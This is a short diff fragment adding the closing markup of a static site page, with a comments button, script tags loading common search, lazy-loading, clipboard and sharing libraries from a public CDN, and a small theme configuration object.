+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
